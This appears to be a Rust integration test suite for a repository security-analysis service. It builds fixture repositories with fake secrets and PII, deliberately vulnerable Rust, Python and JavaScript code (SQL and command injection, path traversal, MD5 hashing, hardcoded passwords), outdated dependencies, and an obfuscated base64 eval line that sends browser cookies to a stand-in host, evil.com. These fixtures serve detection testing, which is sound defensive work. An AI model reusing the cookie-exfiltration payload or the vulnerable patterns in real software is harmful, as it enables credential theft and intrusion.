use anyhow::Result;
use repository_analysis_service::*;
use super::TestContext;
use std::collections::HashSet;

pub async fn run_tests() -> Result<()> {
    println!("\n🔍 Analysis Engine Integration Tests");
    println!("-" .repeat(40));
    
    test_file_analysis().await?;
    test_security_scanning().await?;
    test_code_analysis().await?;
    test_ml_analysis().await?;
    test_git_analysis().await?;
    test_comprehensive_analysis().await?;
    
    println!("✅ All analysis tests passed");
    Ok(())
}

async fn test_file_analysis() -> Result<()> {
    print!("Testing file analysis... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("file-analysis-repo").await?;
    
    // Add various file types for testing
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "data/users.csv",
        "name,email,ssn\nJohn Doe,john@example.com,123-45-6789\nJane Smith,jane@example.com,987-65-4321"
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "docs/internal.pdf",
        "PDF content would be here"
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "images/screenshot.png",
        "PNG binary data"
    ).await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    let completed_job = context.submit_and_wait_for_job(&job).await?;
    
    // Get file analyses
    let file_analyses = context.storage.postgres.get_job_file_analyses(job.id).await?;
    assert!(!file_analyses.is_empty());
    
    // Check file type detection
    let csv_analysis = file_analyses.iter()
        .find(|a| a.file_path.contains("users.csv"))
        .expect("Should analyze CSV file");
    assert_eq!(csv_analysis.file_type, "csv");
    assert!(csv_analysis.contains_pii, "Should detect PII in CSV");
    
    // Check findings for PII
    let findings = context.get_job_findings(job.id).await?;
    let pii_findings: Vec<_> = findings.iter()
        .filter(|f| matches!(f.finding_type, storage::FindingType::DataLeak))
        .collect();
    assert!(!pii_findings.is_empty(), "Should detect SSN as PII");
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_security_scanning() -> Result<()> {
    print!("Testing security scanning... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("security-scan-repo").await?;
    
    // Add files with various security issues
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        ".env",
        r#"
DATABASE_URL=postgresql://admin:SuperSecret123@localhost/mydb
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_API_KEY=sk_test_FAKE_KEY_FOR_TESTING_ONLY
JWT_SECRET=my-super-secret-jwt-key-do-not-share
GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
"#
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "deploy/terraform.tfvars",
        r#"
api_key = "sk_test_51H4GhXXXXXXXXXXXXXXXXXXXXXXXXXXX"
private_key = <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF32M0w5SjJlgagwcIgaZEiIzH/sW
...
-----END RSA PRIVATE KEY-----
EOF
"#
    ).await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    let _completed_job = context.submit_and_wait_for_job(&job).await?;
    
    let findings = context.get_job_findings(job.id).await?;
    
    // Verify secret detection
    let secret_findings: Vec<_> = findings.iter()
        .filter(|f| matches!(f.finding_type, storage::FindingType::SecretExposure))
        .collect();
    
    assert!(!secret_findings.is_empty(), "Should detect exposed secrets");
    
    // Check for specific secret types
    let secret_types: HashSet<String> = secret_findings.iter()
        .map(|f| f.title.clone())
        .collect();
    
    assert!(secret_types.iter().any(|t| t.contains("AWS")), "Should detect AWS keys");
    assert!(secret_types.iter().any(|t| t.contains("JWT")), "Should detect JWT secret");
    assert!(secret_types.iter().any(|t| t.contains("GitHub") || t.contains("Token")), "Should detect GitHub token");
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_code_analysis() -> Result<()> {
    print!("Testing code analysis... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("code-analysis-repo").await?;
    
    // Add code with various issues
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "src/user_controller.rs",
        r#"
use diesel::prelude::*;
use crate::models::User;

// SQL Injection vulnerability
pub fn get_user(conn: &PgConnection, user_id: &str) -> QueryResult<User> {
    let query = format!("SELECT * FROM users WHERE id = {}", user_id);
    diesel::sql_query(query).get_result(conn)
}

// Command injection vulnerability
pub fn ping_host(host: &str) -> String {
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(format!("ping -c 4 {}", host))
        .output()
        .expect("Failed to execute ping");
    
    String::from_utf8_lossy(&output.stdout).to_string()
}

// Path traversal vulnerability
pub fn read_file(filename: &str) -> std::io::Result<String> {
    std::fs::read_to_string(format!("/var/data/{}", filename))
}

// Hardcoded credentials
const ADMIN_PASSWORD: &str = "admin123";

pub fn authenticate(username: &str, password: &str) -> bool {
    username == "admin" && password == ADMIN_PASSWORD
}
"#
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "src/crypto.py",
        r#"
import hashlib
import random

# Weak cryptography
def hash_password(password):
    # MD5 is cryptographically broken
    return hashlib.md5(password.encode()).hexdigest()

# Insecure random
def generate_token():
    # Using random instead of secrets
    return ''.join([str(random.randint(0, 9)) for _ in range(16)])

# Hardcoded encryption key
ENCRYPTION_KEY = "my-secret-key-123"

def encrypt_data(data):
    # Simplified insecure encryption
    return ''.join([chr(ord(c) ^ ord(ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)])) 
                    for i, c in enumerate(data)])
"#
    ).await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    let _completed_job = context.submit_and_wait_for_job(&job).await?;
    
    let findings = context.get_job_findings(job.id).await?;
    
    // Check for vulnerability detection
    let vuln_findings: Vec<_> = findings.iter()
        .filter(|f| matches!(f.finding_type, storage::FindingType::Vulnerability))
        .collect();
    
    assert!(!vuln_findings.is_empty(), "Should detect vulnerabilities");
    
    // Check for specific vulnerabilities
    let vuln_types: HashSet<String> = vuln_findings.iter()
        .map(|f| f.title.to_lowercase())
        .collect();
    
    assert!(vuln_types.iter().any(|t| t.contains("sql") || t.contains("injection")), 
            "Should detect SQL injection");
    assert!(vuln_types.iter().any(|t| t.contains("command") || t.contains("injection")), 
            "Should detect command injection");
    assert!(vuln_types.iter().any(|t| t.contains("crypto") || t.contains("weak") || t.contains("md5")), 
            "Should detect weak cryptography");
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_ml_analysis() -> Result<()> {
    print!("Testing ML analysis... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("ml-analysis-repo").await?;
    
    // Add similar files for similarity detection
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "auth/login.js",
        r#"
function login(username, password) {
    const user = db.query(`SELECT * FROM users WHERE username = '${username}'`);
    if (user && user.password === md5(password)) {
        return generateToken(user);
    }
    return null;
}
"#
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "auth/authenticate.js",
        r#"
function authenticate(email, pass) {
    const account = db.query(`SELECT * FROM accounts WHERE email = '${email}'`);
    if (account && account.pass === md5(pass)) {
        return createSession(account);
    }
    return false;
}
"#
    ).await?;
    
    // Add anomalous file
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "utils/encoder.js",
        r#"
// Obfuscated malicious code
eval(atob('ZnVuY3Rpb24gYmFja2Rvb3IoKSB7CiAgICBmZXRjaCgnaHR0cDovL2V2aWwuY29tL2NvbGxlY3Q/ZGF0YT0nICsgZG9jdW1lbnQuY29va2llKTsKfQ=='));
"#
    ).await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    let _completed_job = context.submit_and_wait_for_job(&job).await?;
    
    // Test embedding generation
    let embeddings = context.storage.vector.get_job_embeddings(job.id).await?;
    assert!(!embeddings.is_empty(), "Should generate embeddings for text files");
    
    // Test similarity detection
    let similar_files = context.storage.vector.find_similar_within_job(
        job.id,
        "auth/login.js",
        0.8,
    ).await?;
    assert!(!similar_files.is_empty(), "Should find similar authentication files");
    
    // Test anomaly detection
    let anomalies = context.storage.vector.detect_anomalies(job.id, 0.3).await?;
    assert!(!anomalies.is_empty(), "Should detect anomalous obfuscated code");
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_git_analysis() -> Result<()> {
    print!("Testing git analysis... ");
    
    // This test would require a real git repository
    // For now, we'll test the git analyzer's ability to handle non-git repos gracefully
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("non-git-repo").await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    job.configuration.insert("include_git_history".to_string(), serde_json::Value::Bool(true));
    
    // Should complete without error even though it's not a git repo
    let completed_job = context.submit_and_wait_for_job(&job).await?;
    assert_eq!(completed_job.status, storage::JobStatus::Completed);
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_comprehensive_analysis() -> Result<()> {
    print!("Testing comprehensive analysis... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("comprehensive-repo").await?;
    
    // Add a mix of files to test all analyzers
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "Cargo.toml",
        r#"
[package]
name = "test-app"
version = "0.1.0"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = "0.11"
serde = { version = "1.0", features = ["derive"] }

# Vulnerable dependency
openssl = "0.9.0"  # Known vulnerabilities
"#
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "package.json",
        r#"{
  "name": "test-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.0.0",
    "lodash": "4.17.4",
    "minimist": "0.0.8"
  }
}"#
    ).await?;
    
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "requirements.txt",
        r#"
Django==2.0.0  # Has known security vulnerabilities
requests==2.6.0  # Outdated version
PyYAML==3.11  # CVE-2017-18342
"#
    ).await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    let completed_job = context.submit_and_wait_for_job(&job).await?;
    
    // Check comprehensive results
    let findings = context.get_job_findings(job.id).await?;
    assert!(!findings.is_empty());
    
    // Should detect various types of issues
    let finding_types: HashSet<_> = findings.iter()
        .map(|f| f.finding_type.clone())
        .collect();
    
    assert!(finding_types.contains(&storage::FindingType::Vulnerability), 
            "Should detect vulnerable dependencies");
    
    // Check risk score calculation
    let job_details = context.storage.postgres.get_job(job.id).await?.unwrap();
    // Risk score should be calculated based on findings
    // (This would be set during report generation)
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_analysis_integration() {
        run_tests().await.unwrap();
    }
}